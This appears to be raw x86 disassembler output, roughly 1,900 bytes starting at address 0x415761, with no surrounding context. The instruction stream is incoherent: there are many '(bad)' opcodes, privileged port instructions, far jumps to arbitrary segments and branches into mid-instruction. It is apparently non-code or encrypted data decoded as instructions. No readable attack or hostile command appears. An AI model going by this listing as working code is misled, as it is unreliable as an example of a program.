  415761:	adc    esi,edi
  415763:	bound  edx,QWORD PTR ds:0xc3576537
  415769:	mov    dh,bh
  41576b:	stos   DWORD PTR es:[edi],eax
  41576c:	inc    edi
  41576d:	jns    0xb495ace3
  415773:	inc    eax
  415774:	add    ebp,esp
  415776:	and    DWORD PTR [ebp+0x54818f10],ebx
  41577c:	stos   DWORD PTR es:[edi],eax
  41577d:	aad    0x3c
  41577f:	mov    DWORD PTR [esi+0xb3deff7],eax
  415785:	push   ebp
  415786:	xor    al,0x6f
  415788:	cmp    al,0xce
  41578a:	jl     0x415726
  41578c:	aam    0x9f
  41578e:	push   edx
  41578f:	push   ecx
  415790:	pop    ebp
  415791:	fisubr DWORD PTR [edi-0x26]
  415794:	jmp    DWORD PTR cs:[bx+di+0x18]
  415799:	pop    esp
  41579a:	aam    0x20
  41579c:	adc    dh,cl
  41579e:	hlt    
  41579f:	jmp    0xe5d17875
  4157a4:	inc    edi
  4157a5:	mov    ebp,0x52b67be0
  4157ab:	xor    eax,0xd295b501
  4157b0:	and    bl,BYTE PTR [edi]
  4157b2:	push   esp
  4157b3:	popa   
  4157b4:	mov    esp,0x860baeb7
  4157b9:	lods   eax,DWORD PTR ds:[esi]
  4157ba:	inc    ebx
  4157bb:	jmp    FWORD PTR [ecx-0x14]
  4157be:	es push 0x7540379
  4157c4:	xor    eax,0xfd3bafbb
  4157c9:	lods   eax,DWORD PTR ds:[esi]
  4157ca:	mov    eax,0xa8d9c69e
  4157cf:	test   eax,0x9136cce6
  4157d4:	cmp    BYTE PTR [ebp-0x69],al
  4157d7:	cmp    ebx,DWORD PTR [edi-0x298aae45]
  4157dd:	mov    ebx,0x4804ae2
  4157e2:	mov    edi,ebx
  4157e4:	dec    esi
  4157e5:	push   ds
  4157e6:	jp     0x415831
  4157e8:	pop    ds
  4157e9:	mov    ds:0xf740ffd3,al
  4157ee:	sbb    BYTE PTR [ecx],bh
  4157f0:	and    BYTE PTR [edi+0x64],dl
  4157f3:	int3   
  4157f4:	dec    eax
  4157f5:	mov    BYTE PTR [edi+0x85626ea],dh
  4157fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4157fc:	push   ecx
  4157fd:	leave  
  4157fe:	repz les ecx,FWORD PTR [ecx]
  415801:	pop    eax
  415802:	dec    esi
  415803:	out    0x86,eax
  415805:	mov    al,ds:0xf5e7ca99
  41580a:	xor    eax,0xd60f8b82
  41580f:	dec    ebx
  415810:	inc    esp
  415811:	mov    dl,0x6d
  415813:	mov    DWORD PTR [edx-0x4b],ebx
  415816:	test   BYTE PTR ds:0x61990166,ch
  41581c:	lods   al,BYTE PTR ds:[esi]
  41581d:	jb     0x4157bf
  41581f:	xchg   edx,eax
  415820:	sbb    eax,0xf6b3f1c0
  415825:	sub    BYTE PTR [edi-0x488ec429],0xae
  41582c:	fst    QWORD PTR [ebp+0x307c7ed3]
  415832:	aad    0xef
  415834:	jl     0x415858
  415836:	jnp    0x4157e0
  415838:	xchg   esi,eax
  415839:	push   ebp
  41583a:	ins    BYTE PTR es:[edi],dx
  41583b:	and    eax,DWORD PTR [edx-0x60b412e9]
  415841:	addr16 std 
  415843:	imul   eax,DWORD PTR [edi-0x5f],0x137d372a
  41584a:	push   edi
  41584b:	push   ds
  41584c:	push   eax
  41584d:	icebp  
  41584e:	jl     0x415821
  415850:	sbb    DWORD PTR [ecx],esi
  415852:	sub    al,0x8b
  415854:	pop    esp
  415855:	and    eax,0xb2f69995
  41585a:	cmp    ecx,eax
  41585c:	jge    0x415835
  41585e:	(bad)  
  41585f:	cmc    
  415860:	inc    esp
  415861:	popf   
  415862:	pop    ds
  415863:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415864:	lods   al,BYTE PTR ds:[esi]
  415865:	mov    ds:0xbf96c660,al
  41586a:	mov    BYTE PTR [ebx+0x56f8976e],ch
  415870:	repnz push es
  415872:	js     0x41588e
  415874:	aad    0x3f
  415876:	daa    
  415877:	or     bh,dh
  415879:	inc    ebx
  41587a:	mov    esi,0x2627b42d
  41587f:	sahf   
  415880:	xchg   ebx,eax
  415881:	sbb    ebx,esi
  415883:	xor    al,0x6a
  415885:	push   0xe
  415887:	push   ebx
  415888:	sub    eax,0x415e6c13
  41588d:	aam    0xeb
  41588f:	dec    eax
  415890:	test   al,0xe7
  415892:	fdiv   QWORD PTR [esi]
  415894:	inc    edx
  415895:	xchg   edi,eax
  415896:	adc    al,0x1
  415898:	(bad)  
  415899:	xor    ecx,DWORD PTR [ebx+0x7a]
  41589c:	sub    esp,ebx
  41589e:	dec    ecx
  41589f:	pop    esp
  4158a0:	sub    bl,BYTE PTR [ebx]
  4158a2:	jb     0x415907
  4158a4:	xor    ebx,DWORD PTR [edx+0xe]
  4158a7:	jg     0x4158da
  4158a9:	add    BYTE PTR [esp+ebx*2+0x7c30768b],0xe1
  4158b1:	dec    ebx
  4158b2:	lds    ebx,FWORD PTR [esi+0x450d09c6]
  4158b8:	rcr    DWORD PTR [ecx-0xff33ec5],1
  4158be:	sub    BYTE PTR ds:0x2d3bd459,dh
  4158c4:	pop    ebx
  4158c5:	mov    bh,0x7b
  4158c7:	mov    ds:0x6b78cfbb,eax
  4158cc:	jnp    0x415856
  4158ce:	out    0xd5,eax
  4158d0:	dec    esp
  4158d1:	or     DWORD PTR [edi-0x62],0xffffffca
  4158d5:	nop
  4158d6:	add    eax,0x3db098f0
  4158db:	mov    BYTE PTR [edi+ebx*4],dl
  4158de:	add    ecx,esi
  4158e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4158e1:	es cdq 
  4158e3:	or     eax,0xf546e414
  4158e8:	je     0x41595d
  4158ea:	cwde   
  4158eb:	retf   0x30b3
  4158ee:	and    dh,BYTE PTR [eax-0x56]
  4158f1:	xchg   edi,eax
  4158f2:	mov    cl,0x4f
  4158f4:	cwde   
  4158f5:	adc    al,0xd4
  4158f7:	repz dec edi
  4158f9:	add    dl,dh
  4158fb:	dec    ebp
  4158fc:	js     0x415972
  4158fe:	push   esi
  4158ff:	fs jns 0x41591c
  415902:	sub    bl,BYTE PTR [ecx-0x6]
  415905:	stc    
  415906:	aad    0x9b
  415908:	les    ebx,FWORD PTR [edi+0x72]
  41590b:	adc    dh,BYTE PTR [ecx]
  41590d:	nop
  41590e:	pop    ss
  41590f:	xor    eax,0x6bf60a40
  415914:	mov    BYTE PTR [esi-0x35ddb07e],ch
  41591a:	arpl   WORD PTR [eax+0x59],di
  41591d:	xor    BYTE PTR [edx],dh
  41591f:	jmp    0x707:0x98ea1714
  415926:	mov    edi,0xab96287b
  41592b:	loop   0x4158c6
  41592d:	push   esp
  41592e:	stos   BYTE PTR es:[edi],al
  41592f:	fimul  DWORD PTR ds:0x3bc6c140
  415935:	push   cs
  415936:	add    eax,0xc4507039
  41593b:	bound  esi,QWORD PTR [ebx]
  41593d:	clc    
  41593e:	mov    ds,WORD PTR [ebp+0x2ef1446f]
  415944:	sbb    DWORD PTR [esi],esi
  415946:	xor    al,0x3a
  415948:	xchg   DWORD PTR [edx],esi
  41594a:	and    eax,0x28467314
  41594f:	jle    0x4159b7
  415951:	add    BYTE PTR gs:[esi],bh
  415954:	add    esi,edi
  415956:	jbe    0x415982
  415958:	std    
  415959:	mov    bh,0x56
  41595b:	mov    edx,DWORD PTR [ebp+0x38dd3299]
  415961:	pop    ds
  415962:	jp     0x4158fc
  415964:	sbb    al,0x2c
  415966:	cmp    al,0xc8
  415968:	jl     0x415905
  41596a:	jb     0x41597b
  41596c:	ja     0x41599a
  41596e:	jo     0x4159bb
  415970:	or     BYTE PTR [edx+ebp*2],cl
  415973:	push   edi
  415974:	call   0xa31c332b
  415979:	mov    BYTE PTR [ecx],ch
  41597b:	fadd   DWORD PTR cs:[ebp+0x2d]
  41597f:	pop    ds
  415980:	dec    ecx
  415981:	cmp    DWORD PTR [edx-0x3806f176],edi
  415987:	scas   al,BYTE PTR es:[edi]
  415988:	iret   
  415989:	das    
  41598a:	imul   esi,eax,0x46db4ee7
  415990:	std    
  415991:	sahf   
  415992:	mov    ah,bh
  415994:	or     BYTE PTR [edi-0x61fc3fc3],0x40
  41599b:	ss call 0x1b5dcde1
  4159a1:	in     al,dx
  4159a2:	mov    ebx,0xce943770
  4159a7:	pop    ecx
  4159a8:	mov    ds:0x5ba31dbb,al
  4159ad:	clc    
  4159ae:	mov    ds:0x9d87d996,eax
  4159b3:	popf   
  4159b4:	adc    ebx,edx
  4159b6:	ds mov eax,0xd23a12cd
  4159bc:	fmul   QWORD PTR [edi+0x4d]
  4159bf:	jmp    0xd336d5ea
  4159c4:	ror    BYTE PTR [ebp-0x2d],cl
  4159c7:	(bad)  
  4159c8:	dec    eax
  4159c9:	jge    0x415a14
  4159cb:	sti    
  4159cc:	push   0xc8092877
  4159d1:	xchg   DWORD PTR es:[edi-0x36],eax
  4159d5:	popa   
  4159d6:	adc    ebx,esp
  4159d8:	frstor [ebx]
  4159da:	out    0xc2,eax
  4159dc:	(bad)  
  4159dd:	mov    dl,0x78
  4159df:	ret    
  4159e0:	cmp    ebx,DWORD PTR [ebp+ebx*1+0x56]
  4159e4:	sbb    ch,bl
  4159e6:	mov    bh,0xba
  4159e8:	icebp  
  4159e9:	into   
  4159ea:	jecxz  0x4159c0
  4159ec:	xchg   edx,eax
  4159ed:	jle    0x415a59
  4159ef:	inc    esp
  4159f0:	lods   al,BYTE PTR ds:[esi]
  4159f1:	jmp    0x2237dc39
  4159f6:	jnp    0x4159bb
  4159f8:	test   BYTE PTR [esi-0x59],0x6
  4159fc:	sbb    DWORD PTR [edi-0x283b3e72],edx
  415a02:	mov    al,0xcd
  415a04:	adc    BYTE PTR [ecx-0x7f39d5ca],0xdf
  415a0b:	xor    bl,BYTE PTR [edi+0x34]
  415a0e:	ret    0xbf56
  415a11:	retf   0xd83c
  415a14:	test   eax,0xc3d2578c
  415a19:	and    al,0x5c
  415a1b:	xchg   ebp,eax
  415a1c:	inc    ebp
  415a1d:	add    eax,0x8db6fba5
  415a22:	or     dl,BYTE PTR [esp+esi*4]
  415a25:	xchg   DWORD PTR [edx],esi
  415a27:	das    
  415a28:	idiv   DWORD PTR [edi]
  415a2a:	xor    edx,esp
  415a2c:	mov    BYTE PTR [ecx+ecx*1-0x39],dh
  415a30:	add    edi,DWORD PTR [ebx-0x2e]
  415a33:	into   
  415a34:	xor    eax,0xb2278a09
  415a39:	mov    dh,0xa1
  415a3b:	or     BYTE PTR [eax],al
  415a3d:	lods   al,BYTE PTR ds:[esi]
  415a3e:	stc    
  415a3f:	and    eax,0xf0c50724
  415a44:	jmp    0x415a90
  415a46:	jo     0x4159eb
  415a48:	icebp  
  415a49:	mov    al,ds:0xc2bfb843
  415a4e:	dec    edx
  415a4f:	(bad)  
  415a50:	shr    DWORD PTR [esi],1
  415a52:	jno    0x415a96
  415a54:	shl    BYTE PTR [ebx],1
  415a56:	in     eax,0x77
  415a58:	or     DWORD PTR [edi-0xb98778f],esi
  415a5e:	dec    edx
  415a5f:	and    eax,0xa5db9b54
  415a64:	pop    ecx
  415a65:	pop    ecx
  415a66:	daa    
  415a67:	jp     0x415a6a
  415a69:	das    
  415a6a:	shr    DWORD PTR [ecx+0x46d20f1b],cl
  415a70:	lahf   
  415a71:	pop    eax
  415a72:	mov    ebp,0x96748d0c
  415a77:	adc    BYTE PTR [edx],cl
  415a79:	xchg   esp,eax
  415a7a:	pushf  
  415a7b:	icebp  
  415a7c:	sbb    ah,BYTE PTR [ecx-0x48f68489]
  415a82:	mov    WORD PTR ds:0x4a0547cf,cs
  415a88:	in     al,dx
  415a89:	or     ch,BYTE PTR [ebx+edx*2+0x63a6e069]
  415a90:	outs   dx,BYTE PTR ds:[esi]
  415a91:	test   BYTE PTR [ecx+ebp*8+0x258ffb81],cl
  415a98:	(bad)  
  415a99:	xchg   esi,eax
  415a9a:	daa    
  415a9b:	mov    eax,0xaa9b3665
  415aa0:	mov    ecx,0xf33f9972
  415aa5:	cwde   
  415aa6:	arpl   sp,sp
  415aa8:	jecxz  0x415a67
  415aaa:	sbb    al,0x61
  415aac:	repz pop edi
  415aae:	ja     0x415b04
  415ab0:	rcl    dh,1
  415ab2:	pop    edx
  415ab3:	cld    
  415ab4:	jns    0x415a59
  415ab6:	mov    DWORD PTR [edx],esp
  415ab8:	or     BYTE PTR [eax-0x5],ah
  415abb:	xchg   bx,ax
  415abd:	push   ebp
  415abe:	add    al,0x0
  415ac0:	retf   
  415ac1:	mov    ds:0x37cc2bc1,al
  415ac6:	popf   
  415ac7:	push   ss
  415ac8:	adc    ch,dl
  415aca:	in     al,dx
  415acb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415acc:	fsub   st,st(3)
  415ace:	lock leave 
  415ad0:	loop   0x415b14
  415ad2:	sbb    al,0xd7
  415ad4:	in     eax,dx
  415ad5:	(bad)
  415ada:	lods   eax,DWORD PTR ds:[esi]
  415adb:	int3   
  415adc:	pop    edx
  415add:	xchg   esp,eax
  415ade:	sub    al,0xe6
  415ae0:	fidivr WORD PTR [ebp+0x6f724f71]
  415ae6:	adc    ch,bl
  415ae8:	(bad)  
  415ae9:	call   DWORD PTR [eax+0x62c1aa9a]
  415aef:	pop    ebp
  415af0:	lahf   
  415af1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415af2:	or     al,0xf7
  415af4:	push   bp
  415af6:	pop    ebp
  415af7:	mov    ebp,DWORD PTR [ebp-0x46]
  415afa:	and    al,0x7f
  415afc:	sbb    al,0xd1
  415afe:	in     eax,0x6a
  415b00:	jmp    0xf281:0x1366a041
  415b07:	xor    eax,0x8f582102
  415b0c:	data16 jns 0x415aea
  415b0f:	(bad)  
  415b11:	mov    eax,ds:0xd65c9d67
  415b16:	xchg   ecx,eax
  415b17:	sub    al,0x40
  415b19:	inc    edx
  415b1a:	pop    ecx
  415b1b:	and    ebx,DWORD PTR [ecx]
  415b1d:	mov    dh,0xef
  415b1f:	or     BYTE PTR [eax],ah
  415b21:	xlat   BYTE PTR ds:[ebx]
  415b22:	call   0x765013d6
  415b27:	sahf   
  415b28:	je     0x415afb
  415b2a:	cld    
  415b2b:	mov    al,0xcd
  415b2d:	mov    ds:0xf7841424,eax
  415b32:	adc    DWORD PTR [esi+0x775f67bc],esi
  415b38:	test   al,al
  415b3a:	dec    edx
  415b3b:	in     al,dx
  415b3c:	mov    dl,0x5b
  415b3e:	and    DWORD PTR [ecx+0x7f],ebp
  415b41:	add    BYTE PTR [ebx+0x4be4ab82],al
  415b47:	fcomp  DWORD PTR [edi]
  415b49:	mov    edx,0x33ce8789
  415b4e:	cld    
  415b4f:	test   al,0x1e
  415b51:	(bad)  
  415b52:	stc    
  415b53:	enter  0x914b,0xf6
  415b57:	xor    DWORD PTR [edx-0x7694378b],eax
  415b5d:	cdq    
  415b5e:	sbb    eax,0xbb332925
  415b63:	test   al,0x1
  415b65:	cmp    DWORD PTR ds:0xe72bffc2,ebx
  415b6b:	xchg   edx,eax
  415b6c:	pop    ds
  415b6d:	push   eax
  415b6e:	sbb    eax,0x69c81c3e
  415b73:	shr    BYTE PTR [ecx-0x286fffed],1
  415b79:	stos   DWORD PTR es:[edi],eax
  415b7a:	stos   DWORD PTR es:[edi],eax
  415b7b:	or     edi,edx
  415b7d:	jae    0x415be4
  415b7f:	adc    BYTE PTR [esi+0x59],dl
  415b82:	rep stos BYTE PTR es:[edi],al
  415b84:	pop    eax
  415b85:	rcr    BYTE PTR [ebx],1
  415b87:	imul   ebx,DWORD PTR [ebx],0xaec8aa58
  415b8d:	lds    ebp,FWORD PTR [edi]
  415b8f:	add    al,0x54
  415b91:	fs jns 0x415b24
  415b94:	fs push cs
  415b96:	mov    al,0xd
  415b98:	dec    edi
  415b99:	popa   
  415b9a:	shr    BYTE PTR [esi+0x17],0xf5
  415b9e:	mov    ds:0x311118ba,al
  415ba3:	sbb    eax,0x6f51f1a
  415ba8:	pushf  
  415ba9:	mov    DWORD PTR [eax+0x4295d85],esp
  415baf:	rcr    DWORD PTR [esi],0x1c
  415bb2:	mov    ds:0xe5ba9b3c,eax
  415bb7:	lea    esi,[edi-0x22]
  415bba:	retf   
  415bbb:	into   
  415bbc:	(bad)  
  415bbd:	scas   al,BYTE PTR es:[edi]
  415bbe:	(bad)  
  415bbf:	int    0x6
  415bc1:	fisttp WORD PTR [edx]
  415bc3:	pusha  
  415bc4:	dec    edx
  415bc5:	adc    edi,DWORD PTR [edi]
  415bc7:	cli    
  415bc8:	pop    ebp
  415bc9:	xchg   BYTE PTR [edi-0x39f72941],dh
  415bcf:	fisub  WORD PTR [ebp+esi*4-0x3d0cc0cf]
  415bd6:	pusha  
  415bd7:	xchg   esi,eax
  415bd8:	sub    DWORD PTR [edx+0x30],ebx
  415bdb:	mov    ?,WORD PTR [esi]
  415bdd:	mov    ds:0x167f8e36,eax
  415be2:	(bad)  
  415be3:	push   ebx
  415be4:	ds pop ss
  415be6:	xchg   ebx,eax
  415be7:	jl     0x415c22
  415be9:	sbb    eax,0xd6f6ba02
  415bee:	ins    DWORD PTR es:[edi],dx
  415bef:	pop    ds
  415bf0:	hlt    
  415bf1:	js     0x415b8b
  415bf3:	adc    DWORD PTR [eax-0x6b],edx
  415bf6:	xchg   ebp,eax
  415bf7:	dec    ebx
  415bf8:	dec    ebx
  415bf9:	pushf  
  415bfa:	inc    edx
  415bfb:	loope  0x415bc6
  415bfd:	push   ebx
  415bfe:	addr16 push esi
  415c00:	retf   
  415c01:	dec    ebx
  415c02:	mov    ebp,0xf58d3ec0
  415c07:	mov    edx,0xf4b8c6b7
  415c0c:	mov    eax,ds:0x86b4a9b7
  415c11:	sub    edx,DWORD PTR [esi+0x508378de]
  415c17:	xor    bl,BYTE PTR [edi+esi*1+0x72]
  415c1b:	shr    DWORD PTR [esi+0x1cb4c3d3],cl
  415c21:	mov    esi,0x7f0ee5fc
  415c26:	ja     0x415c63
  415c28:	sub    al,0xd5
  415c2a:	push   0x222eda52
  415c2f:	stos   BYTE PTR es:[edi],al
  415c30:	shr    DWORD PTR ds:0xfcf53d00,1
  415c36:	pop    eax
  415c37:	enter  0x6989,0x1f
  415c3b:	cwde   
  415c3c:	xor    eax,0xdbda37df
  415c41:	test   BYTE PTR [ecx-0x75],dh
  415c44:	push   ebp
  415c45:	ds je  0x415c92
  415c48:	sbb    DWORD PTR [edx+0x4e],edi
  415c4b:	xchg   ecx,eax
  415c4c:	lock dec esi
  415c4e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415c4f:	shl    DWORD PTR [edi],cl
  415c51:	jecxz  0x415c6e
  415c53:	lds    edi,FWORD PTR ds:0x49c33aea
  415c59:	xchg   ebp,eax
  415c5a:	jle    0x415c53
  415c5c:	sub    edi,esp
  415c5e:	mov    dh,BYTE PTR [eax+0x394cccd9]
  415c64:	jne    0x415ca7
  415c66:	or     eax,0x42ef6be2
  415c6b:	out    dx,al
  415c6c:	xchg   edx,eax
  415c6d:	xor    edx,0x51e6e75a
  415c73:	push   cs
  415c74:	mov    esi,0xcebcbd6d
  415c79:	sbb    ebx,eax
  415c7b:	std    
  415c7c:	enter  0xb046,0x4
  415c80:	mov    esp,esp
  415c82:	jb     0x415c5d
  415c84:	pop    edx
  415c85:	(bad)  
  415c86:	lods   al,BYTE PTR ds:[esi]
  415c87:	daa    
  415c88:	lahf   
  415c89:	dec    edi
  415c8a:	lods   al,BYTE PTR ds:[esi]
  415c8b:	fs (bad) 
  415c8d:	mov    edx,0x9bafd324
  415c92:	xchg   ecx,eax
  415c93:	arpl   WORD PTR [ecx-0x7c563cbd],bx
  415c99:	repnz and DWORD PTR ds:[edi],ebp
  415c9d:	dec    ecx
  415c9e:	mov    bl,0xea
  415ca0:	add    edx,ecx
  415ca2:	xchg   BYTE PTR [edx+esi*1],cl
  415ca5:	(bad)  
  415ca6:	stos   BYTE PTR es:[edi],al
  415ca7:	add    BYTE PTR [ebx-0x4b05cd2a],cl
  415cad:	jge    0x415ce2
  415caf:	add    bl,ch
  415cb1:	jbe    0x415d11
  415cb3:	or     BYTE PTR [ebp+0x1c6a70dc],bl
  415cb9:	ins    DWORD PTR es:[edi],dx
  415cba:	sbb    DWORD PTR [edx],0x59
  415cbd:	fdiv   DWORD PTR [ebp+0x3a]
  415cc0:	shl    DWORD PTR [eax-0x51],0x14
  415cc4:	xor    DWORD PTR [esi+0x5a],edx
  415cc7:	jae    0x415cc6
  415cc9:	aaa    
  415cca:	mov    DWORD PTR [edx-0x46593a1f],0x127ff249
  415cd4:	das    
  415cd5:	mov    ah,0x26
  415cd7:	or     BYTE PTR [edi+0x1b3ce415],dh
  415cdd:	adc    dl,BYTE PTR [edx-0x36]
  415ce0:	pop    es
  415ce1:	cmc    
  415ce2:	retf   
  415ce3:	mov    DWORD PTR [edx+0x46846db5],0x3054134
  415ced:	not    BYTE PTR [eax+0x5]
  415cf0:	sub    DWORD PTR ds:0x4d93b65e,eax
  415cf6:	add    esi,ebp
  415cf8:	pop    esp
  415cf9:	ss (bad) 
  415cfb:	sbb    esi,eax
  415cfd:	pop    DWORD PTR [edx+ecx*8]
  415d00:	mov    eax,0x83e3273a
  415d05:	xchg   ebp,eax
  415d06:	retf   0xe2de
  415d09:	imul   esp,DWORD PTR [esi+ebp*8+0x68c6d495],0xffffffc4
  415d11:	pushf  
  415d12:	(bad)  
  415d13:	stos   BYTE PTR es:[edi],al
  415d14:	popa   
  415d15:	cmp    al,0x7
  415d17:	loopne 0x415d43
  415d19:	clc    
  415d1a:	mov    edi,ebp
  415d1c:	push   ecx
  415d1d:	js     0x415d0c
  415d1f:	dec    esi
  415d20:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415d21:	or     DWORD PTR [eax+0x41],0x9d322afa
  415d28:	push   esp
  415d29:	add    eax,0x18f9e51b
  415d2e:	ficomp DWORD PTR [edx]
  415d30:	jmp    0x415d43
  415d32:	aaa    
  415d33:	and    al,0xeb
  415d35:	lods   al,BYTE PTR ds:[esi]
  415d36:	dec    ebp
  415d37:	or     al,0x3a
  415d39:	xchg   ebx,eax
  415d3a:	and    BYTE PTR [eax],bh
  415d3c:	inc    edi
  415d3d:	sub    ah,BYTE PTR [ecx]
  415d3f:	cmp    ebx,DWORD PTR [edx-0x39e2329d]
  415d45:	enter  0x2a68,0xfa
  415d49:	dec    esp
  415d4a:	xlat   BYTE PTR ds:[ebx]
  415d4b:	push   ebx
  415d4c:	sub    esi,DWORD PTR [ebp-0x73]
  415d4f:	jmp    0x5d06bf48
  415d54:	cld    
  415d55:	jae    0x415d1e
  415d57:	mov    ah,0xf9
  415d59:	cmp    al,0x20
  415d5b:	xchg   DWORD PTR [esi-0x73],edx
  415d5e:	jmp    0xf0b96320
  415d63:	adc    DWORD PTR [edx],ebx
  415d65:	rcr    DWORD PTR [ecx+0x6db2991a],1
  415d6b:	scas   eax,DWORD PTR es:[di]
  415d6d:	arpl   WORD PTR [ecx],ax
  415d6f:	mov    esp,0xcb672f92
  415d74:	dec    ebx
  415d75:	jbe    0x415d12
  415d77:	jne    0x415d70
  415d79:	jb     0x415da2
  415d7b:	ds sbb dh,0x3e
  415d7f:	jge    0x415ddc
  415d81:	sar    BYTE PTR [edi+0x2f],1
  415d84:	(bad)  
  415d85:	xor    edx,edi
  415d87:	stos   BYTE PTR es:[edi],al
  415d88:	mov    esi,0x3292ad91
  415d8d:	mov    al,0x80
  415d8f:	xor    al,0xc
  415d91:	mov    ebx,0x1cdbf3e5
  415d96:	and    ch,BYTE PTR [ebx-0x12]
  415d99:	pop    ss
  415d9a:	and    al,0xb6
  415d9c:	mov    al,ds:0x7d204e45
  415da1:	xchg   ecx,eax
  415da2:	adc    al,0xe7
  415da4:	pop    eax
  415da5:	mov    dh,0x46
  415da7:	cwde   
  415da8:	das    
  415da9:	imul   edx,ebx,0x668a2ee1
  415daf:	call   0xa4fe:0xc8c1f662
  415db6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415db7:	mov    ebp,0xe0a482ba
  415dbc:	cmp    esi,DWORD PTR [edi]
  415dbe:	mov    ds:0x27e4224e,eax
  415dc3:	pop    ss
  415dc4:	sbb    ch,ah
  415dc6:	add    al,0xae
  415dc8:	addr16 enter 0xa734,0xe1
  415dcd:	dec    edx
  415dce:	arpl   WORD PTR [eax],di
  415dd0:	scas   eax,DWORD PTR es:[edi]
  415dd1:	push   edx
  415dd2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415dd3:	cmp    eax,0xc9757c82
  415dd8:	jmp    0xa60f4751
  415ddd:	sti    
  415dde:	pop    ds
  415ddf:	leave  
  415de0:	jp     0x415dd1
  415de2:	popa   
  415de3:	cdq    
  415de4:	jecxz  0x415db9
  415de6:	call   0xd466b02e
  415deb:	out    dx,al
  415dec:	pop    ds
  415ded:	call   FWORD PTR [ecx-0x7e]
  415df0:	push   cs
  415df1:	jns    0x415dd0
  415df3:	int    0x81
  415df5:	mov    dh,0x50
  415df7:	loopne 0x415e59
  415df9:	xchg   ecx,eax
  415dfa:	mov    bh,0x13
  415dfc:	outs   dx,DWORD PTR ds:[esi]
  415dfd:	ja     0x415e71
  415dff:	jb     0x415e7a
  415e01:	xchg   ebp,eax
  415e02:	add    eax,0x5d3ce498
  415e07:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415e08:	cmp    eax,0x93bc7ffa
  415e0d:	aam    0xce
  415e0f:	jns    0x415e06
  415e11:	int    0x91
  415e13:	pop    eax
  415e14:	inc    edi
  415e15:	cmc    
  415e16:	fidiv  DWORD PTR [ebx+0x2bdf7ddc]
  415e1c:	adc    DWORD PTR [edi],ebp
  415e1e:	xor    al,0x45
  415e20:	cmc    
  415e21:	(bad)  
  415e22:	in     eax,dx
  415e23:	or     al,0xe8
  415e25:	xchg   edx,eax
  415e26:	jbe    0x415e07
  415e28:	sbb    dh,dl
  415e2a:	in     al,dx
  415e2b:	inc    ebx
  415e2c:	jmp    0x4f02:0xd06d8037
  415e33:	loopne 0x415e3b
  415e35:	jbe    0x415e4d
  415e37:	repnz mov cl,0x45
  415e3a:	mov    ds:0x48a6d144,al
  415e3f:	pop    ss
  415e40:	dec    esi
  415e41:	sub    bh,BYTE PTR [ebp-0x1d]
  415e44:	std    
  415e45:	jle    0x415e9c
  415e47:	enter  0x1c6c,0x5c
  415e4b:	inc    ebx
  415e4c:	cmp    DWORD PTR [eax+0x7d],esp
  415e4f:	push   es
  415e50:	dec    ecx
  415e51:	inc    eax
  415e52:	stos   BYTE PTR es:[edi],al
  415e53:	dec    ebx
  415e54:	sbb    DWORD PTR [edx+0x21],edx
  415e57:	or     BYTE PTR [ebp-0x38],cl
  415e5a:	loope  0x415e2c
  415e5c:	mov    al,0x89
  415e5e:	leave  
  415e5f:	std    
  415e60:	dec    esi
  415e61:	pop    edx
  415e62:	cmp    cl,BYTE PTR [edi]
  415e64:	repz mov ch,0xda
  415e67:	scas   eax,DWORD PTR es:[edi]
  415e68:	out    dx,al
  415e69:	(bad)  
  415e6a:	(bad)  
  415e6b:	pop    ss
  415e6c:	test   BYTE PTR [ebx+edx*4-0x34],bl
  415e70:	stc    
  415e71:	and    dl,dl
  415e73:	and    al,0xba
  415e75:	stc    
  415e76:	cmp    al,0xd6
  415e78:	sbb    esi,0x29
  415e7b:	cs lock mov esp,0x7172afa8
  415e82:	leave  
  415e83:	or     DWORD PTR [ebx],ebx
  415e85:	jbe    0x415e55
  415e87:	sbb    esi,0xd9cc9812
  415e8d:	cmp    al,ah
  415e8f:	adc    eax,DWORD PTR [eax+0x24]
  415e92:	push   ebx
  415e93:	and    al,0x4c
  415e95:	push   DWORD PTR [eax+0x2b]
  415e98:	jb     0x415f16
  415e9a:	call   0x6977e483
  415e9f:	xchg   ebp,eax
  415ea0:	std    
  415ea1:	mov    ebx,0x965d7ece
  415ea6:	les    ebx,FWORD PTR [eax]
  415ea8:	push   cs
  415ea9:	adc    cl,BYTE PTR [ebp-0x48]
  415eac:	das    
  415ead:	xchg   ecx,eax
  415eae:	adc    DWORD PTR [eax-0x46926e95],edi
  415eb4:	inc    ebp
  415eb5:	mov    dl,0x93
  415eb7:	(bad)  
  415eb8:	pop    ss
  415eb9:	jae    0x415ede
  415ebb:	push   edx
  415ebc:	and    BYTE PTR [eax],bh
  415ebe:	cs scas eax,DWORD PTR es:[edi]
  415ec0:	add    dh,BYTE PTR [eax-0x149355e]
  415ec6:	fadd   st(1),st
  415ec8:	xchg   ebx,eax
  415ec9:	or     BYTE PTR [eax+0x3],dl
  415ecc:	sbb    BYTE PTR [edx+0x5a],ch
  415ecf:	inc    esp
  415ed0:	into   
  415ed1:	daa    
  415ed2:	xchg   ebx,eax
  415ed3:	jns    0x415e90
  415ed5:	jnp    0x415eb2
  415ed7:	adc    al,0x60
  415ed9:	mov    ebp,0x9ae4a81d
  415ede:	xchg   DWORD PTR [ebx+0x12],ebx
  415ee1:	test   eax,0x4b53b55e
  415ee6:	mov    BYTE PTR [ecx],bl
  415ee8:	or     eax,0x6973dfd1
  415eed:	fwait
  415eee:	mov    ebp,0x697abbc9
  415ef3:	aaa    
  415ef4:	or     al,BYTE PTR [eax-0x17339e56]
  415efa:	pop    ecx
  415efb:	rol    edi,0x54
  415efe:	shl    ah,1
  415f00:	shl    BYTE PTR [edx-0x7f917ed6],1
  415f06:	add    al,0xc7
  415f08:	mov    ds:0x2a5e2b74,al
  415f0d:	bnd ret 
  415f0f:	inc    edx
  415f10:	mov    esp,0x291707ee
  415f15:	add    eax,0xc68b3fb2
  415f1a:	mov    esi,0x9e0c5a2c
  415f1f:	dec    esi
  415f20:	mov    ah,0x4f
  415f22:	scas   al,BYTE PTR es:[edi]
